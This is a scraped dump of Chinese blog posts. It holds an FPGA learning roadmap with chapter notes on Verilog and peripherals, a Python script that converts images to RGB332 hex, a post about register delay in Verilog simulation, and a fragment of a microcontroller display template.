FPGA结构，工作原理FPGA包括CLB（可配置逻辑模块）、IOB（输入输出模块）、内部连线三大部分，具有和传统的可编程器件所不同的结构。FPGA通过向内部静态存储单元加载编程数据来实现逻辑功能，存储在存储单元中的值来决定逻辑单元的逻辑功能以及各逻辑单元模块之间或模块与I&#x2F;O之间的连接方式，并最终决定了FPGA所实现的功能。FPGA利用小型查找表来实现组合逻辑，每个查找表连接到一个D触发器的输入端，D触发器用来驱动其他逻辑电路或I&#x2F;O，由此构成一个既可以试下组合逻辑功能又可以实现时序逻辑功能的基本逻辑单元模块，这些模块间利用金属线互相连接或连接到I&#x2F;O模块 3. FPGA的特点，独有优势 很多定制化芯片采用FPGA设计，用户不需要投片生产就可以得到合用的芯片 采用FPGA设计ASIC电路，周期短、费用低、风险小、质量稳定 FPGA采用好书CHMOS工艺，功耗低 FPGA体系结构、逻辑单元灵活、集成度高、适用范围广 FPGA兼容了PLD和通用们阵列的优点，可实现大规模的电路 可现场重复编程，后期维护成本低 FPGA是并行计算，可同时满足多功能需求 第二部分 FPGA工程师需要掌握什么技能1. FPGA工程师必备技能1、Verilog语言及其于硬件电路之间的关系； 2、器件结构； 3、开发工具（熟练掌握Synplify、vivodo、ISE、Modelsim)； 4、数字电路（组合电路，触发器，特别是D触发器构成分频器，奇数倍分频占空比为50%，时序电路，并且能用Verilog语言描叙）； 5、熟悉FPGA设计流程（仿真，综合，布局布线，时序分析）； 6、熟练掌握资源估算（特别是slice、lut、ram等资源的估算）； 7、同步设计原理； 8、熟练掌握基本概念（如建立时间，保持时间，流量（即所做FPGA设计的波特率）计算，延迟时间计算（所做FPGA设计），竞争冒险，消除毛刺的方法等等）； 9、具备具体设计经验（对应届生而言如毕业设计）； 10、良好的设计思路（流水线设计即熟称打拍子，在速率资源功耗之间的折中考虑）。 11、 在硬实力中，还需要深度学习数字电路、模拟电路、verilog、c和c++语言、计算机硬件知识、arm嵌入式知识、网络相关知识、图像相关知识、数字信号处理相关知识、linux系统，fpga开发，范围从小到bit、时钟、波形图，大到linux操作系统涵盖范围及其广泛 2. FPGA工程师薪资情况近三年的就业数据看（应届）：2020年就业入职学员平均薪资10384.33元，2021年就业入职学员平均薪资11600元，2022年就业入职学员平均就业薪资12626元。比同期应届毕业生薪资高出52%。如果一位有经验3-5年工作经验的工程师，年平均薪资在30-50万。 第三部分 FPGA学习路线学习路线： VHDL和Verilog都可以作为入门学习，如果你有C语言基础的话，那么更建议从Verilog开始。 推荐一个刷题的网站：HDLbits。 RTL设计主要有组合电路和时序电路两种，还有状态机。 关于RTL的验证，学习者主要掌握如何写一个简单的测试平台以及如何写一些简单的测试用例。 RTL学习容易犯的错误是用软件编程的思想去学习硬件语言，软件编程大多数是顺序执行的，硬件编程大多数是并行执行的。 对于Verilog掌握比较熟练的朋友可以转向system Verilog语言的学习，现在业界的大公司多选用system Verilog作为开发语言，可以将system Verilog看作是c++，Verilog看作是C语言。 仿真工具：常用的mentor的modelsim以及Synposys的VCS 还有一部分是了解FPGA的开发流程：RTL设计 仿真验证 逻辑综合等 我们需要知道为什么需要这些步骤，以及这些步骤完成什么样的功能。 FPGA主流的开发工具：AMD的vivado还要英特尔的Quartus。 熟悉FPGA的开发流程，怎么创建工程，怎么添加源文件。 熟悉常用的IP的配置和使用：PLL FIFO 存储器等，这些IP可以提高我们的效率，避免重复造轮子，怎么配置和调用这些常用的IP。还有一些复杂的IP,比如NIOS，以太网控制器等，这些复杂的IP初级阶段可能用不到，可以进阶的时候再学习。 熟悉一些硬件调试和时序分析的方法。 关于开发工具的使用，强烈建议配合开发板来学习，比较经典的实验有数码管、流水灯、按键、红绿灯。 总结一下：主要是有四点：编程语言、基础知识、开发工具、动手实验 第一章，看懂原理图第二章，点亮LED第三章，简单组合逻辑—多路选择器1. 相关知识1.1 组合逻辑组合逻辑是verilogHDL设计中一个重要的组成部分，从电路的本质上讲，组合逻辑电路的特点是输出信号只是当前时刻输入信号的函数，与其他时刻的输入状态无关，无存储电路，也没有反馈电路。也就是电路的输出电平变化只跟当前输入信号的电平变化有关，不涉及信号跳变沿的处理。 1.2 多路选择器多路选择器是数据选择器的别称，在多数数据传送过程中，能够根据需要将其中任意一路选出来的电路，叫做数据选择器，也成多路选择器或者多路开关 第四章，简单组合逻辑—译码器1. 相关知识1.1 译码器译码是编码的逆过程，在编码时，每一种二进制代码都被赋予了特定的含义，即都表示了一个确定的信号或者对象。把代码状态的特定含义翻译出来的过程叫做译码，实现译码操作的电路称为译码器。或者说，译码器是可以将输入二进制代码的状态翻译成输出信号，以表示原来含义的电路 译码器（decoder）是一类多输入多输出的组合逻辑电路器件，可以分为变量译码和显示译码两类 常见的变量译码器：n-2^n，例如3-8译码器 第五章，简单组合逻辑—半加器1. 相关知识1.1 半加器和全加器加法器时数字电路中经常用到的一种基本器件，主要用于两个数或多个数的加和，加法器分为半加器和全加器。 其中半加器电路是指两个输入数据位相加，输出一个结果位和进位，没有进位输入的加法器电路。是实现两个一位二进制的加法运算电路 而全加器是在半加器的基础上的升级版本，除了加数和被加数加和外还要加上上一级传进来的进位信号 第六章，层次化设计1. 相关知识1.1 层次化设计数字电路中根据模块层次不同有两种基本很结构设计方法，自底向上的设计方法和自顶向下的设计方法 自底向上：的设计是一种传统的设计方法，对设计进行逐次划分的过程是从存在的基本单元触发的，由基本单元构建高层单元，依次向上，直至构建系统 自上而下：从系统级开始，把系统分为基本单元，然后再把每个单元划分为下一层次的基本单元，一直这样做下去，知道直接可以用eda元件库中的原件实现为止 第七章，避免Latch的产生1. 相关知识1.1 Latch的简介Latch其实就是锁存器，是一种在异步电路系统中，对输入信号电平敏感的单元，用来存储信息。 锁存器在数据未锁存是，输出端的信号随输入信号变化，就像信号通过一个缓冲器，一旦锁存信号用效，则数据被锁存，输入信号不起作用。因此，锁存器也被称为透明锁存器，指的是不锁存时输出对于输入时透明的 1.2 异步电路和同步电路异步电路：异步电路主要是组合逻辑电路，用于产生FIFO或RAM的读写控制信号脉冲，但它同时也用在时序电路中，此时它没有统一的时钟，状态变化的时刻是不稳定的，通常输入信号只在电路处于稳定状态时才会发生变化 同步电路：同步电路时由时序电路（寄存器和各种触发器）和组合逻辑电路构成的电路，其所有操作都是在严格的时钟控制下完成的。这些时序电路共享一个时钟CLK，而所有的状态变化都是在时钟的上升沿（或下降沿）完成的 1.3 Latch的危害对毛刺敏感，不能异步复位，复杂的静态时序分析，占用更多的逻辑资源，额外的延时 1.3 几种产生Latch的情况 组合逻辑中if-else条件分支语句缺少else语句 组合逻辑中case条件分支语句条件未完全列举，且缺少default语句 组合逻辑中输出变量赋值给自己 第八章，时序逻辑的开始—寄存器（梦的开始）1. 相关知识1.1 寄存器的简介在组合逻辑电路中 ，存在一个巨大的缺点就是存在竞争冒险，竞争冒险的知识可以参考数字电路相关的书籍，这里不再作过多赘述，竞争冒险这个问题在电路中是非常危险的它会是我们电路处于一个不稳定的状态（考研复试常见考题，必背内容！），那么我们使用时序逻辑，就可以很大的避免这个问题，提高系统的稳定性。 时序逻辑最基本的单元就是寄存器，它具有存储功能，一般是由于触发器和锁存器构成，由时钟脉冲控制。通常来说，将只能存储一位数据的电路叫做存储单元，将用于存储一组数据的存储电路叫做寄存器，例如每个D触发器（D Flip Flop，DFF）能够存储一位二进制码，由N个D触发器可以构成N位寄存器。在实际芯片中寄存器一般按照字节位数设计，所以一般有8位寄存器，16 位寄存器等等。 D触发器的工作原理：在一个脉冲信号（一般为晶振产生的时钟脉冲）上升沿或者下降沿的作用下，将信号从输入端D送到输出端Q，如果时钟脉冲信号的边沿信号未出现，即使输入信号改变，输出信号仍然保持原值，且寄存器应用复位清零功能，其复位又分为同步复位和异步复位 第九章，阻塞赋值与非阻塞赋值1. 相关知识1.1 阻塞赋值阻塞赋值的赋值号用“&#x3D;”表示，对应的电路结构往往与触发沿没有关系，只与输入电平的变化有关系。它的操作可以认为是只有一个步骤的操作，即计算赋值号右边的语句并更新赋值号左边的语句，此时不允许有来自任何其他Verilog语句的干扰，直到现行的赋值完成，才允许下一条赋值语句的执行。 a = 1,b = 2,c = 3, begin a = b+1; b = a+1; c = a+1; end // 结果：a=3,b=4,c=4 1.2 非阻塞赋值非阻塞赋值的赋值号用“≤”表示，对应的电路结构往往与触发沿有关系，只有在触发沿的时刻才能进行非阻塞赋值，它的操作可以看作为两个步骤的过程：在赋值开始时刻，计算赋值号右边的语句，在赋值结束时刻，更新赋值号左边的语句。 在计算非阻塞赋值语句赋值号右边的语句和更新赋值号左边的语句期间，允许其他的verilog语句同时进行操作 非阻塞操作只能用于对寄存器类型变量进行赋值，因此只能用于“initial”“always”块中，不允许用于连续赋值变量“assign”。 简单理解就是说阻塞语句是顺序执行的，非阻塞语句是并行同时执行。 第十章，使用寄存器实现具有计数器功能的电路1. 相关知识学会了计数器的使用，我们可以做很多的事情，可以毫不夸张的讲，在FPGA的设计当中，一切与时间有关的设计，都会用到计数器（在相关的大学专业课程中，也是期末考试必考题目），这里，我们对计数器的相关知识做一个系统的讲解，在实战部分，我们会通过项目工程来实现一个具有计数器功能的电路 1.1 计数器计数是一种最简单最基本的运算，计数器就是实现这种运算的逻辑电路，计数器在数字系统中主要是对脉冲的个数进行计数，比如说时钟脉冲，以达到实现测量、计数和控制的功能，同时兼有分频功能。 计数器在数字系统中应用广泛，如电子计算机的控制器中对指令地址进行计数，以便顺序取出下一条指令，在运算器中作乘法、除法运算时记下加法、减法次数，又如在数字仪器中对脉冲的计数等等 由计数器进行计数的是由外部的晶振产生的时钟，所以我们可以精确的控制具体需要计数的时间 计数器清零有两种情况：计数器记满了自动清零、计数器计数到我们需要的值后进行清零 第十一章、，verilog变量类型的选择方法当使用initial进行赋值是，变量需要reg型 reg（寄存器）类型： 用于存储可变的值，如状态机的状态、计数器的计数值等。 通常在always块内部声明，用于描述时序逻辑。 也可以在模块的端口声明中使用，表示该端口是一个输出端口，其值由always块控制。 当使用initial语句进行初始化时，必须声明为reg类型，因为initial用于初始化时序逻辑。 reg led_out; initial led_out = 1&#x27;b0;// 正确的初始化reg类型变量 wire（线网）类型： 用于表示纯粹的信号传输，不能存储值，只是连接不同模块或逻辑之间的中介。 不能在always块中赋值，只能由连续赋值语句（如assign）或模块端口驱动。 适用于表示组合逻辑的输出，如多个逻辑门的连接。 wire net1; assign net1 = a &amp; b;// 使用assign语句连续赋值给线网类型变量 integer（整数）类型： 用于存储整数值，适用于计数器、循环语句中的计数变量等。 可以在initial或always块中声明和初始化。 通常用于描述非位宽可变的值，如地址计数器。 integer i; initial i = 0;// 正确的初始化integer类型变量 real（实数）类型： 用于表示实数，适用于模拟模型或需要实数计算的场景。 可以在initial或always块中声明和初始化。 在数字逻辑设计中使用较少，更多用于模拟或混合信号设计。 parameter（参数）类型： 用于存储常量值，适用于定义固定参数、数组大小等。 只能在模块的声明部分使用，不能在always块中声明。 一旦赋值，其值在仿真过程中不可更改。 parameter DELAY = 10;// 定义一个常量参数 localparam（局部参数）类型： 类似于parameter，用于存储常量值。 只能在initial或always块中声明，用于在特定作用域内定义常量。 其值在仿真过程中不可更改。 localparam COUNTER_MAX = 100;// 定义一个局部参数 在选择变量类型时，还需要考虑以下因素： 时序逻辑：对于需要在时钟边沿更新的变量，通常使用reg类型。 组合逻辑：对于不需要在时钟边沿更新的变量，通常使用wire类型。 存储需求：对于需要存储计算结果或状态的变量，使用reg或integer类型。 常量定义：对于不需要改变的值，使用parameter或localparam类型。 正确选择变量类型有助于提高代码的可读性和仿真效率，同时也能确保设计的正确实现。 第十二章，分频器—偶分频1. 相关知识分频器是数字系统设计中最常见的基本电路之一。所谓“分频”，就是把输入信号的频率变成成倍数的低于输入频率的输出信号。 分频器分为偶数分频器和奇数分频器，和计数器非常类似，有时候甚至可以说是一个东西。 在《Verilog HDL数字系统设计与实践》中是这样说道：偶数倍分频只需要一个简单的计数器就医可以实现，且分频后的始终占空比可以达到50%。奇数倍分频器只使用计数器是无法达到50%的占空比的，需要利用输入时钟的上、下沿进行计数，产生两个非50%的占空比的奇数分频时钟，然后将两个时钟做异或运算，既可以得到占空比为50%的奇数分频器 1.1 为什么要进行分频一般来说，在我们的开发板上只有一个晶振，这就表示只有一种频率的选择，但是在实际的应用开发时，经常需要对基准时钟进行分频，得到各个模块所需要的频率，如果想要得到比基准时钟更慢的时钟，则需要对基准时钟进行分频，如果想要更快的时钟，则需要进行倍频 第十三章，按键消抖1. 相关知识按键是最常见的电子元器件之一，在电子设计中应用广泛；在日常生活中，遥控器、玩具、计算器等等电子产品都使用按键，在FPGA的实验工程中，我们可以使用其作为系统复位信号或者控制信号的外部输入。 按键消抖主要针对的是机械弹性开关，当机械触电断开、闭合时，由于机械触点的弹性作用，一个按键开关在闭合时不会马上稳定地接通，在断开时也不会一下子断开。 因而在闭合及断开的瞬间均伴随一连串的抖动，未来保证系统能正确识别按键的开关，就必须对按键抖动进行处理，这就是按键消抖 接下来就是使用软件消抖的方法来解决这个问题 第十四章，呼吸灯1. 相关知识在本节内容当中，我们使用Verilog HDL语言和FPGA开发板实现呼吸灯的一个效果 第十五章，状态机1. 相关知识状态机相信大家都有听说过，FPGA是并行执行的，如果说我们想要处理一个前后顺序的事件该怎么办呐，这时候就需要我们的状态机来完成了，这一节很重要。我们从原理、实践应用来给大家总结状态机的原理和方法。 状态机简写FSM，也称为同步有限状态机，我们一般简称为状态机。这里的同步是指在状态机中，所有的状态跳转都是在时钟的周围下进行的。有限表示状态机中状态的个数是有限的。 有限状态机是用老记录电路当前状态的一种电路结构。它包含一组存储器和一系列的外围组合逻辑电路。存储器记录电路的当前状态，而组合逻辑是用来根据当前的状态和当前输入，运算出电路的下一个状态。计算出的下一个状态在书中的下一个边沿被状态机的存储器组读取并存储下来，可以改变电路的状态。因此，对于状态机中的寄存器组，总是存在一条组合逻辑贿赂，将寄存器的输出端口连接到它的输入端口。 同步有限状态机分为两种。第一种被称为Mealy机（谐音：米粒状态机），即状态机的输出不仅决定于状态机的当前状态，还决定于当前时刻的输入。也就是说是基于它的当前状态和输入生成输出的有限状态自动机（更精确的叫有限状态变换器）。这意味着它的状态图将为每个转移边包括输入和输出二者。米利型有限状态机_百度百科 (baidu.com) 另一种同步状态机被称为Moore状态机（谐音：摩尔状态机），与Mealy状态机不同的是Moore机的输出值决定状态机的当前状态，与当前输入没有关系。下面是Moore状态机的结构示意图： 第十六章，SPI、I^2C等通信接口及实验案例1. 相关知识第十七章，字模显示1. 相关知识第十八章，简易DDS信号发生器的设计与验证1. 相关知识DDS是直接数字式频率合成器，是一项关键的数字化技术，几乎在fpga中涉及到信号的项目都会与DDS产生一定的联系，可见它的重要性。因为可以用它来产生方波三角波、锯齿波等不同频率不同相位的信号波形。建议翻阅EDA相关的书籍，里面有详细的公式。 与传统的频率合成器相比，DDS具有成本更低、低功耗、高分辨率和快速转换时间的优点。 DDS的基本结构一般来说可以由四部分或者五部分来组成，分别是相位累加器、相位调制器、波形数据表ROM、D&#x2F;A（数模）转换器。有的设计当中还会增加一个低通滤波器。低通滤波器的作用是对信号的积分， 第十九章，图像处理，边缘检测1. 相关知识第二十章，RS2321. 相关知识UART是一种通用异步收发传输器， UART是一种通用的数据通信协议，也是异步串行通讯口的总称，它在发送数据时将并行数据转换成串行数据来传输，在接收数据时将接收到的串行数据转换成并行数据。 包括RS232，RS499，RS422和RS485等接口标准规范和总线标准规范 SPI和I2C是同步串行通信接口 UART，是全双工通信，在数据发送和接收端都有独立的端口。可以同时进行数据的收和发 名称 符号 数据方向 说明 发送数据 RXD DTE←DEC Receive Data，数据接收信号，即输入 接收数据 TXD DTE→DCE Transmit Data，数据发送信号，即输出。两个设备之间的TXD、RXD应交叉相连 名词解释： 码元：在信息传输的通道中，携带信息的信号单元 码元传输速率（波特率Baud）：每秒钟通过信道传输的码元，单位是BPS，波特每秒 比特率：每秒钟通信信道传输的信息量我们称为位传输速率，也叫做比特率，单位bps，每秒比特数 学习链接 逼真动画展示I2C、SPI、UART的通信过程 在使用至芯FPGA开发板进行验证UART串口通信实验时，通信接口和B型供电口公用，及供电的同时与上位机可以通信。使用到的通信协议是PS232协议，芯片为PL-2303HX。该器件作为USB-RS232双向转换器，一方面从主机接收USB数据并将其转换为RS232信息流格式发送给外设；另一方面从RS232外设接收数据转换为USB数据格式传送回主机。这些工作全部由器件自动完成，开发者无需考虑固件设计。 第二十一章，DHT11数字温湿度传感器1. 相关知识DHT11数字温湿度传感器是一款含有已校准数字信号输出的温湿度复合传感器。它应用专用的数字模块采集技术和温湿度传感器技术，确保产品具有极高的可靠性与卓越的长期稳定性。具有成本低、抗干扰力强、长期稳定等优点，可用于暖通空调、除湿器、农业、医疗等相关湿度检测控制 相关文档:DHT11-chinese.pdf (adafruit.com) 湿度测量范围：5%-95%RH，误差为正负5%，没有小数位 温度测量范围：-20%-60%摄氏度，误差为正负2@，精度为0.1摄氏度 注意：测量周期为大于2s 名称 单总线格式定义 起始信号 微处理器把数据总线（SDA）拉低一段时间至少18ms（最大不得超过30ms），通知传感器准备数据 响应信号 传感器把数据总线（SDA）拉低83微秒，再拉高87微秒 以响应主机的起始信号 数据格式 收到主机起始信号后，传感器一次性从数据总线（SDA）串出40位数据，高位先出 湿度 湿度高位为湿度证书部分数据，湿度低位为湿度小数部分数据 温度 温度高位为温度证书部分数据，温度低位为温度小数部分数据，且温度低位Bit8为1则表示负温度，否则为正温度 校验位 校验位&#x3D;湿度高位+湿度地位+温度高位+温度低位 2. 数据交互时序 参考博客：[FPGA之DHT11温湿度传感器_dht11采集数据的频率-CSDN博客](https://blog.csdn.net/weixin_46628093/article/details/115055623?ops_request_misc=%7B%22request%5Fid%22%3A%22171340380416800178594575%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=171340380416800178594575&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-115055623-null-null.142^v100^pc_search_result_base4&amp;utm_term=fpga dht11&amp;spm&#x3D;1018.2226.3001.4187) 一次性完整的数据传输为40bit，高位先出，数据格式如下： 8bit湿度整数数据+8bit湿度小数数据+8bit温度整数数据+8bit温度小数数据+8bit校验和数据传输正确是校验和数据等于“8bit湿度整数+8bit湿度小数+8bit温度整数+8bit温度小数”所得结果的末8位 用户发送开始信号后，DHT11从低功耗模式转换为高速模式，等待主机开始信号拉高结束后，DHT11发送响应信号，送出40bit的数据。如果没有接受到主机发送的开始信号，DHT11不会主动进行温湿度的采集 3. 信号持续时间总线空闲状态为高电平，主机把总线拉低等到DHT11响应，主机把总线拉低必须大于18毫秒，保证DHT11能够检测到起始信号。 DHT11接收到主机的开始信号后，等待主机开始信号结束，然后发送80us低电平响应信号，主机发送开始信号结束后，延时等待20-40us，读取DHT11的响应信号 第二十二章，ADC模数转换芯片的使用—简易电压表的设计1. 相关知识模数转换器即AD转换器，简称ADC，通常是指一个将模拟信号转变为数字信号的电子元件或者电路，将经过与标准量比较处理后的模拟量转换为以二进制数值表示的离散信号。模拟信号向数字信号转换过程一般分为四个步骤：采样、保持、量化、编码 ADC芯片：TLC549 实验书： TLC549.pdf 2. 并行模块的程序思路3. 串行模块的程序思路第二十三章，FIFO原理功能及应用，IP核调用1. 相关知识FIFO（First In First Out 即先入先出），时一种数据缓冲器，用来实现数据先入先出的读写方式，FIFO根据读写时钟是否相同分为同步FIFO（SCFIFO）、异步FIFO（DCFIFO） FIFO存储器主要是作为缓存，引用在同步时钟系统和异步时钟系统中，在很多的设计中都会使用；比如：多比特数据做跨时钟域处理(面试容易问)、前后宽带不同步等都用到了FIFO 与RAM或ROM相比，它们的读写方式是按照地址进行读取。FIFO与它们不同，它遵循的是先入先出的读写方式，先被写入的数据，先被读出。FIFO没有地址线， 只有两个端口分别是写入端口和读出端口，使用十分方便 写操作：在进行写操作的时候，需要三路有效信号分别是：写时钟信号、写请求信号、写入数据 读操作： 需要两路有效信号，读时钟信号和有效的读请求信号，输出读取信号 针对多比特跨时钟域处理的处理方式如下:在A时钟下写入FIFO，在B时钟下读取 针对前后带宽不同步的处理方式如下:在FIFO设置中，将输入端口设置4位宽，输出端口设置8位宽 第二十四章，RAM原理功能及应用，IP核调用1. 相关知识第二十五章，VGA显示器驱动设计1. 相关知识VGA翻译为视频图形阵列，是一种使用模拟信号进行视频传输的标准协议，由IBM公司在1987年推出，因其分辨率高、显示速度快、颜色丰富等优点，被广泛应用于彩色显示器领域 VGA引脚定义 在接口中，123,13,14这5个引脚最为重要 VGA显示原理VGA显示器采用图像扫描的方式进行图像显示，将构成图像的像素点，在行同步信号和场同步信号的同步下，按照从上到下、从左到右的顺序扫描到显示屏上进行图像的显示 VGA时序标准VESA为例，VGA的时序有两部分构成，行同步时序和 场同步时序， 行同步信号是一个周期性的信号，只有在同步时保持高电平，其他位置保持低电平，基本单位是一个像素点 在行同步时序图中分为6个阶段，但只有在“有效图像”阶段是显示图像，其他阶段都是无效的，起到图像的同步和消隐的作用 与行同步信号不同的是场同步信号的基本单位并不是一个像素点，而是一行，也就是一个完整的行扫描周期。 所以一帧完整的图像信息需要在两个完整的扫描周期下正常显示：行扫描周期和场扫描周期 注意，开发板型号改变Xilinx Artix-7系列，重点在高速接口的设计 第二十六章，RS485串口协议1. 相关知识第二十七章，HDMI显示器驱动设计1. 相关知识第二十八章，摄像头 DDR31. 相关知识第二十九章，高速接口的实现1. 相关知识第三十章，时序约束的介绍1. 相关知识第三十一章，高速光通信项目1. 相关知识第三十二章，以太网通信1. 相关知识 开发芯片更换，Xilinx ZYNQ系列，重点在Linux、PYNQ开发、 开发芯片更换，KV260系列，重点在工业视觉开发、 第三十三章，QT上位机串口通信项目一、12路UART输入，1路UART输出的多路数据采集中集器项目二、多路图像采集处理卡做一个多路图像采集“处理卡，采集hdmi，以太网，光纤，mipi等输入的多路视频流然后可以分别对任意视频流进行预处理“算法(例如滤波)，然后拼接，再用以太网，光纤pocie等上传到pc上位机“进行复杂算法处理。 【2023全国大学生FPGA创新设计大赛-国一】紫光同创-视频处理魔盒_哔哩哔哩_bilibili 第三十四章，Linux操作系统第三十五章，FPGA面试问题 不理解同步电路和异步电路 不理解寄存器复制延时一个时钟周期 对状态机以及状态机输出的波形不清楚 跨时钟域问题 FIFO写爆或读满问题 模块间数据交互问题 BRAM和FIFO控制问题 时序问题（逻辑级数、流水线、扇出） 第三十六章，一些协议的实现","tags":["FPGA","教程","野火"],"categories":["FPGA"]},{"title":"使用python修改图像格式","path":"/2024/08/31/修改图像格式/","content":"功能及代码用户输入图像路径、新宽度、新高度。输出16进制图像数据 程序主要用在串口传图方面。 main.pyimport cv2 import numpy as np def convert_to_rgb332(img): # 取R高3位, &#123;5&#x27;b0, R[7:5]&#125; R = np.right_shift(img[:, :, 2], 5) # 取G高3位, &#123;5&#x27;d0, G[7:5]&#125; G = np.right_shift(img[:, :, 1], 5) # 取B高2位, &#123;6&#x27;d0, B[7:6]&#125; B = np.right_shift(img[:, :, 0], 6) # 拼接 &#123;R[7:5], G[7:5], B[7:6]&#125; rgb332 = (R &lt;&lt; 5) + (G &lt;&lt; 2) + B return rgb332 def save_hex_data(data, filename): # 将数据以十六进制形式保存到文本文件 with open(filename, &#x27;w&#x27;) as f: for value in data.flatten(): f.write(f&#x27;&#123;value:02x&#125; &#x27;) # 使用格式化字符串将整数转换为两位十六进制数 def process_image(image_path, new_width, new_height): # 读取图像 img = cv2.imread(image_path) if img is None: print(&quot;Image not found. Please check the image path.&quot;) return None img = cv2.cvtColor(img, cv2.COLOR_BGR2RGB) # 转换为RGB格式 # 调整图像大小 img = cv2.resize(img, (new_width, new_height)) return img # 图片路径和尺寸 image_path = r&quot;C:\\Users\\Administrator\\Desktop\\5fcf95f976f3998469e9338e61d351f.jpg&quot; new_width = 100 new_height = 100 # 处理图像 img = process_image(image_path, new_width, new_height) if img is not None: # 转换为RGB332格式 rgb332 = convert_to_rgb332(img) # 将rgb332数据以十六进制形式保存到文本文件 save_hex_data(rgb332, &#x27;rgb332.txt&#x27;) 参考链接串口传图：RGB332格式和RGB565格式","tags":["python"],"categories":["python"]},{"title":"为什么FPGA的阻塞赋值会延时一个时钟周期，而在某些情况下不延时一个时钟周期呐？","path":"/2024/06/10/为什么FPGA的阻塞赋值会延时一个时钟周期，而在某些情况下不延时一个时钟周期呐？/","content":"参考资料急问！为什么FPGA的&lt;&#x3D;语句在这种情况下不延迟一拍？ - 知乎 (zhihu.com) 【必看】时序逻辑仿真成组合逻辑？你知道原因吗？ - 知乎 (zhihu.com) 小梅哥爱漂流的个人空间-小梅哥爱漂流个人主页-哔哩哔哩视频 (bilibili.com) 第一种情况​\t在学习FPGA的时候，经常会使用打拍的操作来用来消除亚稳态、获取信号的下降沿检测，来生成一些标志信号 插入两级寄存器进行数据同步，用来消除亚稳态。第三级寄存器和第二级寄存器共同构成下降沿检测，检测到下降沿时start_nedge产生一个时钟的高电平。 uart_rx.v//插入两级寄存器进行数据同步，用来消除亚稳态 //rx_reg1:第一级寄存器，寄存器空闲状态复位为1 always@(posedge clk or negedge rstn) if(rstn == 1&#x27;b0) rx_reg1 &lt;= 1&#x27;b1; else rx_reg1 &lt;= rx; //rx_reg2:第二级寄存器，寄存器空闲状态复位为1 always@(posedge clk or negedge rstn) if(rstn == 1&#x27;b0) rx_reg2 &lt;= 1&#x27;b1; else rx_reg2 &lt;= rx_reg1; //rx_reg3:第三级寄存器和第二级寄存器共同构成下降沿检测 always@(posedge clk or negedge rstn) if(rstn == 1&#x27;b0) rx_reg3 &lt;= 1&#x27;b1; else rx_reg3 &lt;= rx_reg2; //start_nedge:检测到下降沿时start_nedge产生一个时钟的高电平 always@(posedge clk or negedge rstn) if(rstn == 1&#x27;b0) start_nedge &lt;= 1&#x27;b0; else if((~rx_reg2) &amp;&amp; (rx_reg3)) start_nedge &lt;= 1&#x27;b1; else start_nedge &lt;= 1&#x27;b0; 信号延时一拍的原因，比如如上图所示，我们设置的是时钟上升沿检测信号变化。，当rx信号在时钟上升沿到来之前是高电平，来临之后变换为低电平，那么通过打一拍赋值给的新的寄存器的信号是在时钟到来之前的电平状态，也还就是高电平。因此信号会延时一个时钟周期的变换。主要原因是信号的赋值是根据时钟边沿变化的前一时刻来赋值的 当前程序的仿真情况如图所示： 第二种情况test.vmodule test( input clk, //系统时钟； input rst, //系统复位，高电平有效； input [1:0] in, output [1:0] out ); reg [1:0] in_r,in_rr; //分别打一拍、打两拍 assign out = in_rr; always@(posedge clk or posedge rst)begin if(rst)begin in_r &lt;= 2&#x27;d0; //复位初始值 in_rr &lt;= 2&#x27;d0; //复位初始值 end else begin in_r &lt;= in; //输入打一拍 in_rr &lt;= in_r; //输入打两拍 end end endmodule tb_test.v`timescale 1 ns/1 ns module tb_test(); //输入输出端口 reg clk; reg rst; reg [1:0] in; wire [1:0] out; //例化被测试模块 test u_test ( .clk (clk), .rst (rst), .in (in ), .out (out) ); //生成系统时钟，周期10ns; initial begin clk = 1; forever #5 clk = ~clk; end //生成复位信号 initial begin rst = 1; #25; rst = 0; end //生成输入信号（测试激励） initial begin in = 0; #30; repeat(8)begin //循环8次； #10 in = in + 1; //输入递增1 end $stop; //停止仿真 end endmodule 当赋值的时候给#1延时用来模拟Tco（寄存器的时钟到输出延迟）的时候，仿真如下 虽然在上面的参考文献中，作者给出了出现第二种情况的答案，是因为D触发器的建立时间、保持时间、输出延时的原因。但是我还是有一点没有弄明白，为什么跟第一种情况不一样，如果作者的答案是正确的，那么就不会出现第一种情况了吧。留坑，碰见大佬解答 破案（又立案）先贴出答案 原因很简单，但是是一个小细节很难注意到。我们先来分析一下TestBench的代码片段。 //生成输入信号（测试激励） initial begin in = 0; #30; repeat(8)begin //循环8次； #10 in = in + 1; //输入递增1 end $stop; //停止仿真 end 根据上上面的仿真图像可以看到，in的赋值与时钟上升沿是对齐的，并且in使用的是阻塞赋值，也就是说在时钟上升沿的那一刻数据发生了变化， 可以看到，······· 新问题我们使用了阻塞赋值，在时钟上升沿时数据产生了变化，那么这里的tsu建立时间并不能满足要求。查阅资料得知当tus不满足时，数据将不被正确采样，而是等到下一个时钟周期的时候，数据才能被正确写入寄存器当中。那么问题来了，我们的数据是怎么写入寄存器里面的呐？ 下面是testbench在阻塞赋值下的门级仿真 另一个新的问题（2024.6.10）：单比特数据夸时钟域处理的问题因为具体的问题是出现在亚稳态上的，并且跟这个问题相似，所以在这里一并记录下来。 在阅读王敏志编著的《FPGA设计实战演练高级技巧篇》P19的时候，作者讲到单比特数据夸时钟域处理方法可以使用2级或者3级同步器（打拍操作）来解决信号跨时钟域时出现亚稳态的情况，人体就出现这个亚稳态的部分，请看下面的图像： 问题1.时钟1输出数据1的数据为什么没有时钟沿对齐? 问题2.在时钟2第一次采样的时候确实是位于亚稳态区域，但是第二次采样应该可以采集到正确的数据了。为什么数据2还是位于亚稳态？ 问题3. 既然是亚稳态，问什么数据2在时钟2的采样边沿可以采集到“高”？","tags":["FPGA疑难杂症"],"categories":["FPGA"]},{"title":"这是一个文章模版","path":"/2024/04/28/文章模版/","content":"main.cppvoid loop() &#123; if (millis() - lastMs &gt;= 5000) &#123; lastMs = millis(); mqttCheckConnect(); mqttIntervalPost(); &#125; client.loop(); lcd.setCursor(0,0); lcd.printf(&quot;Temp:%.2f &quot;, tep); lcd.print((char)223); lcd.print(&quot;C&quot;); lcd.setCursor(0,1); lcd.printf(&quot;Humi:%.2f &quot;, soil_data); lcd.print(&quot;%RH&quot;); // 在OLED屏幕上更新显示 display.clearDisplay(); // 清除旧的显示内容 display.setCursor(0, 10); display.print(&quot;Temp: &quot;); display.print(tep, 2); display.print((char)223); display.println(&quot;C&quot;); display.setCursor(0, 20); display.print(&quot;Humi: &quot;); display.print(soil_data, 2); display.println(&quot;%RH&quot;); display.setCursor(0, 30); 